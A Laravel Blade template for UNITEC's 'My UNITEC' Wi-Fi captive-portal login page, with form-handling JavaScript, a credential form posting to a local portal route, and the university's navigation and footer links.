<!DOCTYPE html>
<html>
<head runat="server">
    <meta charset="utf-8" />
    <meta name="description" content="Diagramación Homme UNITEC" />
    <link rel="stylesheet" href="{{asset('unitec/css/estilos.css')}}">
    <link rel="stylesheet" href="{{asset('unitec/css/responsivemobilemenu.css')}}" type="text/css">
    <script type="text/javascript" src="{{asset('unitec/js/jquery.min.js')}}"></script>
    <script type="text/javascript" src="{{asset('js/responsivemobilemenu.js')}}"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
    <title>My UNITEC</title>
</head>
<script src="{{asset('unitec/js/valide.js')}}">

</script>

<script type="text/javascript">
    /*function test_register() {
        var user = {
                Name: $('#txtuser').val(),
                Password: $('#txtpass').val(),
                Phone: $('#txtphone').val()
        };
        $.ajax({
            url: "/Home/AddDetailsTwo",
            data: user,
                    type: "POST",
                    success: function (data)
                    {
                        alert(data.valor);
                        document.forms.sso.submit();

                    },
                    error: function (req, status, error)
                    {
                        alert("Req: " + req);
                        alert("Status: " + status);
                        alert("Error: " + error);
                    }

                });
    }*/
    function fnsso() {
        var txtuser = document.getElementById("username");
        var txtpass = document.getElementById("password");

        setCookie("ssusername", txtuser.value, 1);

        if (txtuser.value != "" && txtpass.value != "" && txtuser.value != "Cuenta MyUnitec" && txtpass.value != "password") {
            //txtpass.value = trim(txtpass.value);
            if (txtpass.value != "") {
                //test_register();
                document.forms.sso.submit();
                //PageMethods.GetSamAccountName(txtuser.value, txtpass.value, enExito, enFalla);
            }
            else {
                alert("Por favor inserte los datos!");
            }
        }
        else {
            alert("Por favor inserte los datos!");
        }
        return false;
    }
    function enExito(response) {
        var txtuser = document.getElementById("txtuser");
        if (response != "") {
            txtuser.style.color = "#ffffff"
            txtuser.value = response;
            document.forms.sso.submit();
        }
        else {
            txtuser.value = response;
            alert("Por favor inserte los datos!");
        }
    }
    function enFalla(error) {
        alert(error);
    }
    function setCookie(c_name, value, exdays) {
        var exdate = new Date();
        exdate.setDate(exdate.getDate() + exdays);
        var c_value = escape(value) + ((exdays == null) ? "" : "; expires=" + exdate.toUTCString());
        document.cookie = c_name + "=" + c_value;
    }
    function trim(text) {
        while (text.charAt(0) == "0") {
            text = text.substr(1, text.length - 1);
        }
        return text;
    }
</script>
<body onload="inicializar();">
    <header>
        <section id="logo_UNITEC">
            <a href="http://www.unitec.mx/"><img src="{{asset('unitec/images/Logo_UNITEC.png')}}" alt="" /></a>
        </section>
    </header>
    <div style="background-color:#006FBA;">
        <nav class="rmm">
            <ul>
                <li><a href="http://www.unitec.mx/" target="_blank"><img src="{{asset('unitec/images/casa_homme_azul.png')}}" alt="" width="22px"></a></li>
                <li><a href="http://www.unitec.mx/" target="_blank">UNITEC</a></li>
                <li><a href="http://unisel.unitec.mx/ssel/login.jsp" target="_blank">Servicios en Línea</a></li>
                <li><a href="http://bolsadetrabajo.unitec.mx/" target="_blank">Bolsa de Trabajo</a></li>
                <li><a href="https://comunidad.unitec.mx/unitec" target="_blank">Comunidad UNITEC</a></li>
            </ul>
        </nav>
    </div>

    <div class="container body-content">
      <section id="contenido">
    <h2>My UNITEC</h2>
    <article class="cuadro_azul"></article>
    <section id="primer_contenido">
        <img src="{{asset('unitec/images/My_UNITEC.jpg')}}" alt="">
        <div class="contenido_introduccion">
            <h3>¡Con la red Wi-Fi de My UNITEC podr&aacute;s estar conectado todo el tiempo!</h3>
            <p>Ingresar a la red es muy sencillo:</p>
            <ol>
                <li>Detecta la red inal&aacute;mbrica MY UNITEC_( Nombre del CAMPUS ).</li>
                <li>Coloca usuario y contrase&ntilde;a de tu cuenta MY UNITEC.</li>
            </ol>
            <br />
            <span class="boton_1"><a href="http://www.unitec.mx/correo" target="_blank">Conoce más sobre My UNITEC aquí</a></span>
            <div id="ingresar">
                <h1>Ingresa aqu&iacute;</h1>

                <form id="sso" runat="server" method="POST" action="{{url('/submit_unitec')}}">
                <!-- <form id="sso" runat="server" method="post" action="http://172.1.0.2:9997/login"> -->
                    {{ csrf_field() }}
                    <input class="form-control" type="hidden" id="site_code" name="site_code" value="{{$site}}" />
                    <asp:ScriptManager ID="ScriptManager1" runat="server" EnablePageMethods="true" EnablePartialRendering="true" />

                    <input type="text" id="username" name="username" value="Cuenta MyUnitec" onblur="setValue(this);" onkeypress="return SinEspacios(event);" onfocus="limpiar(this);" onchange="this.value=this.value.toLowerCase();" /><span></span>
                    <!-- <input type="number" maxlength="10" id="txtphone" name="txtphone" placeholder="Telefono" /> -->
                    <span>@my.unitec.edu.mx</span>
                    <input type="password" id="password" name="password" value="password" onblur="setValue(this);" onkeypress="return SinEspacios(event);" onfocus="limpiar(this);" />
                    <input class="form-control" type="hidden" id="res" name="res" value=" <?php isset($_GET['res']) ? $_GET['res'] : '' ?>" />
                    <input class="form-control" type="hidden" id="auth" name="auth" value="<?php isset($_GET['auth']) ? $_GET['auth'] : '' ?>">
                    <div id="boton_entrar"><a onclick="fnsso();">Entrar</a></div>


                </form>

            </div>
            <p style="text-align:center; margin:10px 0;"> <a href="http://www.unitec.mx/politicas-de-privacidad/">Acepto Políticas de Privacidad</a></p>
        </div>

        <div id="solicitud">
            <div class="texto_solicita">
                <h1>Si no conoces tu usuario y contrase&ntilde;a de MY UNITEC</h1>
                <div class="solicita_informacion">
                    <a href="http://live.my.unitec.edu.mx/" target="_blank">Obtén tu usuario aquí</a>
                </div>
            </div>

        </div>
    </section>
</section>
<p style="text-align:center; margin:10px 0;"> <img src="{{asset('unitec/images/alerta.jpg')}}" width="20px" style="margin:0 10px;"><a href="http://www.unitec.mx/correo/">Reporta problemas de la Red My UNITEC aquí </a></p>
    </div>

        <footer>
            <section id="primera_parte_footer">
                <article class="seccion_ligas_footer">
                    <h4>CONOCE UNITEC</h4>
                    <ul>
                        <li><a href="http://www.unitec.mx/calidad-educativa/" target="_blank">La UNITEC</a></li>
                        <li><a href="http://www.unitec.mx/nuestra-trayectoria/" target="_blank">Misión</a></li>
                        <li><a href="http://www.unitec.mx/reconocimientos-academicos/" target="_blank">Reconocimientos</a></li>
                        <li><a href="http://www.unitec.mx/programas-internacionales/" target="_blank">Programas Internacionales</a></li>
                        <li>
                          <a href="https://my.laureate.net/Faculty/Pages/home.aspx?pflg=3082" target="_blank">Portal Administrativo</a>
                        </li>
                    </ul>
                </article>
                <article class="seccion_ligas_footer">
                    <h4>ALUMNOS</h4>
                    <ul>
                        <li><a href="http://live.my.unitec.edu.mx/" target="_blank">Correo Electrónico</a></li>
                        <li><a href="http://www.unitec.mx/biblioteca-digital/">Bibiloteca Digital</a></li>
                        <li><a href="http://live.my.unitec.edu.mx/" target="_blank">Wi-fi my UNITEC</a></li>
                        <li><a href="http://www.unitec.mx/servicio-social">Servicio Social</a></li>
                        <li><a href="http://u47facturae02.unitec.mx/SCFD_EMIBASE_WEB_BUZON/Account/LogOn" target="_blank">Factura Electrónica</a></li>
                        <li><a href="http://unisel.unitec.mx/ssel/login.jsp" target="_blank">Servicios en Línea</a></li>
                    </ul>
                </article>
                <article class="seccion_ligas_footer_ultimo">
                    <h4>CAMPUS</h4>
                    <ul>
                        <li><a href="http://www.unitec.mx/instalaciones-atizapan/">Atizapán</a></li>
                        <li><a href="http://www.unitec.mx/instalaciones-ecatepec/">Ecatepec</a></li>
                        <li><a href="http://www.unitec.mx/instalaciones-cuitlahuac/">Cuitláhuac</a></li>
                        <li><a href="http://www.unitec.mx/instalaciones-marina/">Marina</a></li>
                        <li><a href="http://www.unitec.mx/instalaciones-sur/">Sur</a></li>
                        <li><a href="http://www.unitec.mx/instalaciones-toluca/">Toluca</a></li>
                        <li><a href="http://www.unitec.mx/campus-enlinea/">Campus en Línea</a></li>
                    </ul>
                </article>
                <aside id="informes">
                    <h5>INFORMES PARA NUEVO INGRESO</h5>
                    <h6>01 800 7 UNITEC</h6>
                    <p>(864832)</p>
                </aside>
            </section>
            <section id="segunda_parte_footer">
                <article>
                    <a href="http://www.unitec.mx/terminos-y-condiciones/" target="_blank">Consulta los Términos y condiciones</a> | <a href="http://www.unitec.mx/politicas-de-privacidad/" target="_blank">Políticas de Privacidad</a> | <a href="https://comunidad.unitec.mx/unitec" target="_blank">Comunidad UNITEC</a>
                </article>
                <aside>
                    <img src="{{asset('unitec/images/iconos_seguridad.png')}}" alt="">
                </aside>
            </section>
            <section id="tercera_parte_footer">
                <p>Universidad Tecnol&oacute;gica de M&eacute;xico. Derechos Reservados 2013 UNITEC Direcci&oacute;n: Av. Marina Nacional No. 162, Col. Anáhuac, México, D.F., 11320</p>
                <p>Tel: 11 02 00 22 atencion@mail.unitec.mx Laureate Education Inc.</p>
            </section>
        </footer>


</body>
</html>
